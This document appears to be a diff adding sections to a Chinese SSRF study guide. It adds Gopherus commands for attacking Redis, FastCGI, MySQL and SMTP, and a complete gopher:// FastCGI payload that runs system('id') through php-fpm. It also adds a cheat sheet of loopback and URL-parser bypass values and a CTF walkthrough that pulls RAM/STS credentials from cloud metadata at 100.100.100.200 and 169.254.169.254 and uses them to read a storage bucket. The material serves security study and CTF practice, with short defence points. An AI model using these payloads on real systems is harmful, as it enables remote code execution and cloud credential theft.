@@ -123,6 +123,70 @@ SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者�
 
 不是所有环境都支持，但在特定技术栈里很容易形成“看起来像 SSRF，最后打成文件读取、反序列化或协议交互”的链条。
 
+## Gopherus 工具
+
+gopher 可以构造任意 TCP 报文，理论上能打所有“无认证、明文协议”的内网服务，但手写协议包容易在长度、编码上出错。Gopherus 用于自动生成这类 payload：
+
+- 项目地址：<https://github.com/tarunkant/Gopherus>
+
+```bash
+# 打 Redis：写 Webshell / 写 SSH 公钥 / 写计划任务反弹 Shell
+python gopherus.py --exploit redis
+
+# 打 FastCGI（php-fpm）：通过 PHP_VALUE 注入执行任意 PHP 代码
+python gopherus.py --exploit fastcgi
+
+# 打 SMTP：在内网邮件服务器上伪造 / 发送邮件
+python gopherus.py --exploit smtp
+
+# 打 MySQL：目标允许无密码登录时执行任意 SQL（写 Webshell、读数据）
+python gopherus.py --exploit mysql
+
+# 其他服务（Zabbix、memcached 等，视工具版本支持）
+python gopherus.py --exploit zabbix
+```
+
+使用要点：
+1. 生成的 payload 默认已完成一次 URL 编码；如果 SSRF 入口还会再编码一次（浏览器地址栏提交、接口二次转发），要整体再编码一次（`%01` → `%2501`）
+2. payload 以 `gopher://<ip>:<port>/_` 开头，`_` 之后才是真正发往目标的原始字节流
+3. 生成后记得把 IP、端口、Web 根目录等占位值改成实际环境
+
+### 手写 gopher 打 FastCGI（9001 端口执行命令）
+
+Gopherus 生成的 FastCGI payload，本质是把下面这几个 FastCGI record 拼起来再做 URL 编码（目标是 `127.0.0.1:9001` 上的 php-fpm）：
+
+```text
+# 1) BEGIN_REQUEST：role = FCGI_RESPONDER
+\x01\x01\x00\x01\x00\x08\x00\x00
+\x00\x01\x00\x00\x00\x00\x00\x00
+
+# 2) PARAMS：record 头声明内容长度 0x00BE = 190 字节
+\x01\x04\x00\x01\x00\xBE\x00\x00
+\x0f\x17SCRIPT_FILENAME/var/www/html/index.php          # 必须指向服务器上真实存在的 php 文件
+\x09\x36PHP_VALUEallow_url_include = On\nauto_prepend_file = php://input   # 核心：把 STDIN 内容当前置 PHP 执行
+\x0e\x04REQUEST_METHODPOST
+\x0c\x21CONTENT_TYPEapplication/x-www-form-urlencoded
+\x0e\x02CONTENT_LENGTH22
+\x01\x04\x00\x01\x00\x00\x00\x00                        # PARAMS 空包，参数区结束
+
+# 3) STDIN：要执行的 PHP 代码（长度 0x16 = 22 字节，与 CONTENT_LENGTH 一致）
+\x01\x05\x00\x01\x00\x16\x00\x00
+<?php system('id'); ?>
+\x01\x05\x00\x01\x00\x00\x00\x00                        # STDIN 空包，输入区结束
+```
+
+PARAMS 采用 `nameLen + valueLen + name + value` 编码，长度小于 128 时占 1 字节（`\x0f` = 15 是 `SCRIPT_FILENAME` 的名字长度，`\x17` = 23 是路径值的长度，以此类推）。整段做 URL 编码后拼到 `gopher://` 后，得到完整利用 URL：
+
+```text
+gopher://127.0.0.1:9001/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%BE%00%00%0F%17SCRIPT_FILENAME/var/www/html/index.php%09%36PHP_VALUEallow_url_include%20%3D%20On%0Aauto_prepend_file%20%3D%20php%3A%2F%2Finput%0E%04REQUEST_METHODPOST%0C%21CONTENT_TYPEapplication/x-www-form-urlencoded%0E%02CONTENT_LENGTH22%01%04%00%01%00%00%00%00%01%05%00%01%00%16%00%00%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%01%05%00%01%00%00%00%00
+```
+
+要点：
+- `SCRIPT_FILENAME` 必须是目标机器上真实存在的 php 文件（php-fpm 会校验），路径不明时先通过报错页、源码泄露、phpinfo 获取
+- 利用核心是 `PHP_VALUE` 里的 `auto_prepend_file = php://input` + `allow_url_include = On`，让 php-fpm 在执行脚本前先执行 STDIN 中的代码
+- 修改 body 后必须同步更新 `CONTENT_LENGTH` 和 STDIN record 的长度字段（十六进制）
+- 如果环境禁用了 `allow_url_include`，可改用 `auto_prepend_file = data://` 或先写文件再包含的思路
+
 ## 盲 SSRF 与带外验证
 ### 1. 常见验证方式
 - DNSLog
@@ -215,6 +279,75 @@ SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者�
 - 内部路由器把请求转发到错误的后端
 
 这类问题更像“请求被错路由进内网”，但本质上仍然是在借服务端网络位置发请求。
+
+### 9. 具体绕过值速查表
+
+上面讲的是思路，这里直接给出可落地的具体绕过值，按场景分组。
+
+#### a. `127.0.0.1` 的替代表示
+
+| 写法 | 说明 |
+| --- | --- |
+| `http://2130706433` | 十进制整数形式（127×256³+1） |
+| `http://0x7f000001` | 十六进制整数形式 |
+| `http://0x7f.1`、`http://0x7f.0.0.1` | 十六进制分段混合 |
+| `http://0177.0.0.1`、`http://017700000001` | 八进制形式（`0177` = 127） |
+| `http://127.1`、`http://127.000.000.001` | 省略段 / 补零形式 |
+| `http://127.0000000001` | 末段长数字被按八进制解析（`0000000001` = 1，等效 `127.0.0.1`） |
+| `http://0`、`http://0.0.0.0` | 全零地址，多数环境指向本机 |
+| `http://[::1]`、`http://[::]`、`http://[0000::1]` | IPv6 回环 / 未指定地址 |
+| `http://[::ffff:127.0.0.1]` | IPv6 映射 IPv4 |
+| `http://127。0。0。1` | 全角句号 `。`（U+3002），WHATWG 解析器会规范化为 `.` |
+| `http://①②⑦.0.0.1` | Unicode 带圈数字，部分解析器按 UTS-46 映射为 `127` |
+
+> 混合进制形式依赖底层 `inet_aton` 类解析（curl、老版本 Python/PHP 后端常见），浏览器和多数新解析器已不支持，对老后端效果好。
+
+#### b. `localhost` 的替代域名（公网 DNS 解析到内网）
+
+| 写法 | 解析结果 |
+| --- | --- |
+| `http://localtest.me` | `127.0.0.1`（公共服务，专门解析到回环） |
+| `http://127.0.0.1.nip.io` | `127.0.0.1`（把 IP 直接写进域名） |
+| `http://10.0.0.1.nip.io` | `10.0.0.1` |
+| `http://127.0.0.1.sslip.io` | `127.0.0.1`（nip.io 的同类替代） |
+| `http://customer1.app.localhost.my.company.127.0.0.1.nip.io` | `127.0.0.1`（前缀可任意加，常用于绕“域名前缀白名单”） |
+| `http://spoofed.<你的Collaborator-ID>.burpcollaborator.net` | Burp 协作服务器（验证出网用） |
+
+#### c. 后缀 / 前缀 / 包含校验绕过
+
+校验逻辑是字符串级别（“必须以 xxx 开头 / 结尾 / 包含 xxx”）时：
+
+| Payload | 原理 |
+| --- | --- |
+| `http://trusted.com@127.0.0.1` | `@` 前是 userinfo，实际 host 是 `127.0.0.1` |
+| `http://evil@127.0.0.1` | 同上，`@` 前内容任意 |
+| `http://127.0.0.1#@trusted.com` | `#` 后是 fragment，校验器取错位置即误判 |
+| `http://127.0.0.1/#` | 部分校验器按 `#` 截断后再拼后缀判断 |
+| `http://127.0.0.1/?x=.com` | `?` 后是查询串，绕“必须包含 .com”类校验 |
+| `http://127.0.0.1\.com` | curl 把 `\` 当 `/`，字符串校验器却把 `127.0.0.1\.com` 当 host |
+| `http://127.0.0.1%2523.trusted.com` | `#` 双重编码，利用两次解码差异 |
+
+#### d. URL 解析差异类（校验器与请求库对同一 URL 认知不一致）
+
+| Payload | 差异点 |
+| --- | --- |
+| `http://evil.com\@127.0.0.1` | WHATWG（浏览器/新库）把 `\` 当 `/`，认为访问 `evil.com` 而放行；curl 把 `\` 当普通字符，`evil.com\` 是 userinfo，实际请求 `127.0.0.1` |
+| `http://127.0.0.1\@evil.com` | 反向场景：curl 实际访问 `evil.com`，WHATWG 认为访问 `127.0.0.1` |
+| `http://127。1.1.1` | 全角句号规范化差异（WHATWG 会转成 `127.1.1.1`） |
+| `http://①②⑦.0.0.1` | Unicode 数字映射差异 |
+| `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` | 空格、`&`、`@`、`#` 混合，不同解析器提取出的 host 各不相同 |
+
+> 解析差异类 payload 没有万能解，关键是先弄清“哪个库在校验、哪个库在发请求”，再针对差异构造。
+
+#### e. 协议前缀校验绕过
+
+有些环境只校验了协议前缀字符串，可以尝试：
+
+| Payload | 原理 |
+| --- | --- |
+| `hTtP://127.0.0.1` | 大小写混淆，部分正则只匹配小写 `http` |
+| ` http://127.0.0.1` | 前导空格 / 空白字符，部分解析器会自动 trim |
+| `httpx://x` 之外的畸形协议头 | 观察报错差异判断协议解析方式 |
 
 ## 云环境关注点
 ### 1. 元数据服务
@@ -365,6 +498,117 @@ SSRF 在云环境中极其危险，因为很多平台会把实例凭证放在本
 3. 再判断是否支持重定向、协议扩展、自定义头、非 GET
 4. 最后再进阶看白名单绕过、解析差异和协议利用
 
+## 案例：云环境 SSRF 完整链路（元数据到 OSS flag）
+
+一道典型云环境 SSRF CTF 题的完整复盘。环境为阿里云 ECS + OSS，思路同样适用于 AWS（元数据地址换成 `169.254.169.254`，命令换成 `aws s3`）。
+
+### 背景
+
+题目是一个“网页卡片生成器”：输入任意 URL，服务端抓取页面并返回标题和状态码。
+
+```text
+POST /api/preview
+{"url": "https://example.com"}
+
+返回：{"code": 0, "data": {"title": "Example Domain", "status": 200}}
+```
+
+### 第一步：确认 SSRF
+
+把 HTTPLog 地址填进参数：
+
+```text
+{"url": "http://xxxx.httplog.cn/test"}
+```
+
+日志平台收到来自题目服务器的 GET 请求，确认服务端会代为访问，且是回显型 SSRF。
+
+### 第二步：确认过滤方式并绕过
+
+```text
+{"url": "http://127.0.0.1:8080/"} → {"code": 403, "msg": "forbidden address"}
+```
+
+内网地址被拦。对照「具体绕过值速查表」逐个替换，`0.0.0.0` 成功（黑名单只匹配了 `127.0.0.1`、`localhost` 字符串）：
+
+```text
+{"url": "http://0.0.0.0:8080/"} → 返回了内网管理页的标题，说明本机 8080 存活
+```
+
+### 第三步：探测内网与云元数据
+
+- 利用回显差异扫内网段 `10.0.x.x`、`172.16.x.x` 的常见端口
+- 题目跑在阿里云 ECS 上，直接打元数据地址：
+
+```text
+{"url": "http://100.100.100.200/latest/meta-data/"}
+
+返回：ami-id/ hostname/ instance-id/ ram/ region-id/ ...
+```
+
+元数据可访问。AWS 环境对应写法：
+
+```text
+http://169.254.169.254/latest/meta-data/            # IMDSv1 可直接 GET
+# IMDSv2 需要先 PUT /latest/api/token 拿 token，再带 X-aws-ec2-metadata-token 头访问
+```
+
+### 第四步：拿 RAM 角色的临时凭证
+
+```text
+# 先拿角色名
+{"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/"}
+→ aliyun-ctf-role
+
+# 再拿角色对应的 STS 凭证
+{"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/aliyun-ctf-role"}
+
+→ {
+    "AccessKeyId": "STS.xxxxxxxxxxxx",
+    "AccessKeySecret": "xxxxxxxxxxxxxxxx",
+    "SecurityToken": "xxxxxxxxxxxxxxxx",
+    "Expiration": "2026-09-09T12:00:00Z"
+  }
+```
+
+注意：SSRF 回显可能截断 JSON，可以用报错外带或分段方式拿全；STS 凭证有时效（`Expiration`），要尽快使用。
+
+### 第五步：用临时凭证读 OSS 里的 flag
+
+本机配置 ossutil（也可用 aliyun CLI 或 Python SDK）：
+
+```bash
+# 配置 STS 临时凭证
+ossutil config -e oss-cn-hangzhou.aliyuncs.com \
+  -i "STS.xxxxxxxxxxxx" \
+  -k "AccessKeySecret" \
+  -t "SecurityToken"
+
+# 列出该角色可访问的 bucket
+ossutil ls
+
+# 读取 flag
+ossutil cat oss://ctf-flag-bucket/flag.txt
+```
+
+AWS 环境对应操作：
+
+```bash
+export AWS_ACCESS_KEY_ID=xxx
+export AWS_SECRET_ACCESS_KEY=xxx
+export AWS_SESSION_TOKEN=xxx
+aws sts get-caller-identity    # 先确认身份与权限
+aws s3 ls
+aws s3 cp s3://ctf-flag-bucket/flag.txt -
+```
+
+### 复盘要点
+
+1. 云环境题优先打元数据，这是出凭证最快的路径
+2. 元数据可直接 GET（阿里云 / AWS IMDSv1）时，最普通的回显型 SSRF 就足够用
+3. 拿到 STS 凭证后先确认身份和权限（`GetCallerIdentity`、`ossutil ls`），再定位目标对象，不要乱猜 bucket 名
+4. 防御侧对应：AWS 强制 IMDSv2、RAM 角色最小权限、出网侧阻断 `100.100.100.200` / `169.254.169.254`
+
 ## 速查清单
 - 先找所有“用户输入 URL，服务端代为访问”的功能
 - 先验证是否存在服务端请求，再判断是否有回显
@@ -380,3 +624,5 @@ SSRF 在云环境中极其危险，因为很多平台会把实例凭证放在本
 - [PortSwigger URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
 - [AWS EC2 Instance Metadata Service](https://docs.amazonaws.cn/en_us/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
 - [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
+- [Gopherus - Generate gopher link for exploiting SSRF](https://github.com/tarunkant/Gopherus)
+- [PayloadsAllTheThings - Server-Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
